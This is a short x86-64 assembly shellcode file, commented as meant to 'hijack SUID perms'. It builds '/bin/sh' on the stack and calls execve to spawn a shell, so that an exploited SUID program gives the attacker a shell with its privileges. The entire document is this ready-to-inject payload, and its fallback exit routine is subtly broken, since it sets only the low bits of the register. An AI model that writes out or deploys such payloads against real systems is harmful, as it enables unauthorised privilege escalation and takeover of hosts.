; A simple shellcode to hijack SUID perms

BITS 64

global _start

section .text

_start:
      xor rdi, rdi
      push rdi                  ; Null terminating
      mov rax, 0x68732f6e69622f ; "/bin/sh" -> Little endian
      push rax
      mov rdi, rsp

      xor rsi, rsi
      xor rdx, rdx
      xor eax, eax
      mov al, 0x3b ; execve
      syscall
      jmp _exit

_exit:
      mov ax, 0x3c
      xor rdi, rdi
      syscall

